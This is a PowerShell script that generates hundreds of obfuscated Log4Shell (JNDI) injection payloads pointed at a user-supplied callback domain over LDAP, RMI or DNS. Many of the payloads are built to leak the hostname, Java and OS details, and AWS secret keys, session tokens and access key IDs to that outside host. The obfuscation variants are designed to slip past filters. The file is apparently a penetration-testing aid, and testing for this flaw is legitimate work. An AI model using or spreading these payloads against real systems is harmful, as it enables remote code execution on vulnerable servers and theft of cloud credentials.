# Author: Scott Sutherland, NetSPI 2021
# Create-Log4jPayload -Domain "callback.domain.com" -Port 389
# Todo: encoding, more command variations, protocol variations, and obfuscation variations...
# Notes: You can likely inject into RMI endpoints as well, is anyone looking for endpionts for known platforms exposed to the internet?
function Create-Log4jPayload
(
    [Parameter(Position = 0)][System.String]$Domain,
    [Parameter(Position = 0)][System.String]$Port,
    [Parameter(Position = 0)][System.String]$Word = (1..10 | foreach {[char](Get-Random -min 97 -Maximum 122)}) -join ''
)
{

    # Create list of common jndi variations
    $jndi = new-object System.Data.DataTable 
    $null = $jndi.Columns.Add("value")
    $null = $jndi.Rows.Add("JnDi")
    $null = $jndi.Rows.Add("jndi")
    $null = $jndi.Rows.Add("`${lower:jndi}")
    $null = $jndi.Rows.Add("`${lower:`${lower:jndi}}")
    $null = $jndi.Rows.Add("`${lower:j}`${lower:n}`${lower:d}i")
    $null = $jndi.Rows.Add("`${upper:jndi}")
    $null = $jndi.Rows.Add("`${upper:j}`${upper:n}`${upper:d}i")    
    $null = $jndi.Rows.Add("`${env:TEST:-j}ndi")    
    
    # Create list of common procotols variations
    $Protocol = new-object System.Data.DataTable 
    $null = $Protocol.Columns.Add("value")
    $null = $Protocol.Rows.Add("ldap")
    $null = $Protocol.Rows.Add("`${lower:l}`${lower:d}a`${lower:p}")
    $null = $Protocol.Rows.Add("`${env:TEST:-l}dap")
    $null = $Protocol.Rows.Add("rmi")
    $null = $Protocol.Rows.Add("dns")

    # Create list of presubdomain values for postion 1 - common host ref variations
    $MidPos1 = new-object System.Data.DataTable 
    $null = $MidPos1.Columns.Add("value")
    $null = $MidPos1.Rows.Add("")
    $null = $MidPos1.Rows.Add("127.0.0.1#.")
    $null = $MidPos1.Rows.Add("localhost#.")

    # Create list of presubdomain values for postion 2 - common command variations
    $MidPos2 = new-object System.Data.DataTable 
    $null = $MidPos2.Columns.Add("value")
    $null = $MidPos2.Rows.Add("")
    $null = $MidPos2.Rows.Add("`${upper:l}`${upper:o}`${upper:g}.")
    $null = $MidPos2.Rows.Add("`${hostname}.")
    $null = $MidPos2.Rows.Add("`${sys:user.name}.")  
    $null = $MidPos2.Rows.Add("`${sys:user.home}.")  
    $null = $MidPos2.Rows.Add("`${sys:user.dir}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.home}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vendor}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.version}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vendor.url}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vm.version}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vm.vendor}.")  
    $null = $MidPos2.Rows.Add("`${sys:java.vm.name}.")  
    $null = $MidPos2.Rows.Add("`${sys:os.name}.")  
    $null = $MidPos2.Rows.Add("`${sys:os.arch}.")  
    $null = $MidPos2.Rows.Add("`${sys:os.version}.") 
    $null = $MidPos2.Rows.Add("`${env:username}.")
    $null = $MidPos2.Rows.Add("`${env:user}.")     
    $null = $MidPos2.Rows.Add("`${env:JAVA_VERSION}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_SECRET_ACCESS_KEY}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_SESSION_TOKEN}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_SHARED_CREDENTIALS_FILE}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_WEB_IDENTITY_TOKEN_FILE}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_PROFILE}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_CONFIG_FILE}.")  
    $null = $MidPos2.Rows.Add("`${env:AWS_ACCESS_KEY_ID}.")   

    # Create list of end position value variations
    $EndPos = new-object System.Data.DataTable 
    $null = $EndPos.Columns.Add("value")
    $null = $EndPos.Rows.Add("")
    $null = $EndPos.Rows.Add("/")
    $null = $EndPos.Rows.Add("/$word")
    $null = $EndPos.Rows.Add(":$Port")
    $null = $EndPos.Rows.Add(":$Port/")
    $null = $EndPos.Rows.Add(":$Port/$word")

    # Payload variations
    $PayloadVariations = new-object System.Data.DataTable 
    $null = $PayloadVariations.Columns.Add("payload")


    # Generate Payload Variations
    $jndi | Select-Object value -ExpandProperty value |
    Foreach{        
        $Currentjndi = $_
        $Protocol | Select-Object value -ExpandProperty value |
        Foreach{    
            $CurrentProtocol = $_       
            $MidPos1 | Select-Object value -ExpandProperty value |
            Foreach{
                $CurrentMidPos1 = $_         
                $MidPos2 | Select-Object value -ExpandProperty value | 
                Foreach{
                    $CurrentMidPos2 = $_          
                    $EndPos | Select-Object value -ExpandProperty value |
                    foreach{
                        $CurrentEndPos = $_
                        $null = $PayloadVariations.Rows.Add("`${$Currentjndi" + ":" + $CurrentProtocol + "://" + $CurrentMidPos1 + $CurrentMidPos2 + $domain + $CurrentEndPos + "}")
                    }   
                }      
            } 
        }      
    }

    # Show variations
    $PayloadVariations

    # Show variation count
    $PayloadCount = $PayloadVariations.payload.Count
    Write-Verbose "$PayloadCount payloads were generated"

    # Clear Tables
    $Protocol.Rows.Clear()
    $MidPos1.Rows.Clear()
    $MidPos2.Rows.Clear()
    $EndPos.Rows.Clear()
}
